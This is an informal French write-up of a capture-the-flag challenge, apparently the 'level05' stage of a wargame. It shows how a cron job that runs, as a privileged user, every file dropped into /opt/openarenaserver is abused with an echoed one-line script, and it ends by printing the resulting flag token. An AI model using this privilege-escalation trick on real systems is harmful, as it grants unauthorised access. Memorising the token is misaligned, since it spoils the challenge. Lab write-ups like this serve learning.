ls -la
rien

parcontre je viens de remarquer que j'ai eux un message lors de la connection
level05@[ip]'s password: 
You have new mail.

je vais chercher comment voir les mail
j'ai trouver ca /var/spool/mail/
donc je fais ls /var/spool/mail/

je trouve un fichier level05 qui contien
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05

c une commande pour executer un sh dans /usr/sbin/openarenaserver
je pense
je vais voir ce qu'il y a dans ce dossier

ce n'est pas un dossier mais un fichier qui contient 
#!/bin/sh

for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done

a vue d'oeil il rm -f tous les fichier dans le dossier mais avent ca il l'execute 

donc on peut cree un petit script qui nous donne le flag

vue qu'il le delete presque instante il faut le cree d'un coup avec un echo
echo "/bin/getflag > /tmp/result" > /opt/openarenaserver/script

donc in dit fait getflag met le result dans /tmp/result et cescript met le dans /opt/openarenaserver/script

et apres on cat /tmp/result
et voila 
Check flag.Here is your token : viuaaale9huek52boumoomioc